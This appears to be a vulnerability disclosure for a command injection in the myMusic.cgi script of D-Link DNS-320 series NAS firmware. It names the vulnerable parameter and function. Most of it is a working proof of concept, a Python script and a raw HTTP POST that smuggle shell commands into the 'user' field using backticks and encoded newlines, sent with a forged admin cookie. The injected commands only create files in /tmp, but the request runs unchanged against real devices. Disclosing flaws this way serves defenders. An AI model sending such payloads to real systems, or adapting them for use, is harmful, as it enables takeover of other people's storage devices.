# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)

# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_get_tracks_list function of the file /cgi-bin/myMusic.cgi.  The variable `user`is passed from a POST request and is assigned to `v1` via the `snprintf` function at line 64  and invoked by the `system` command,  it can lead to command execution.

![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723710010583-795d9b8b-0438-4b1b-81dc-24e2d3faea10.png#averageHue=%23f9f9f5&clientId=u077ab749-c3ad-4&from=paste&height=176&id=u53f51271&originHeight=176&originWidth=1028&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32889&status=done&style=none&taskId=ud037b65f-88ac-4a8e-9bc4-86a2c2f09c3&title=&width=1028)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/myMusic.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_get_tracks_list&user=`touch%09/tmp/113`&type=1&user=photos&idx=10&user=%0atouch%09/tmp/112%0a&genre=10&date=19&r=/tmp/"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```
POST /cgi-bin/myMusic.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Cookie: username=admin
Priority: u=1

cmd=cgi_get_tracks_list&user=`touch%09/tmp/113`&type=1&user=photos&idx=10&user=%0atouch%09/tmp/112%0a&genre=10&date=19&r=/tmp/
```

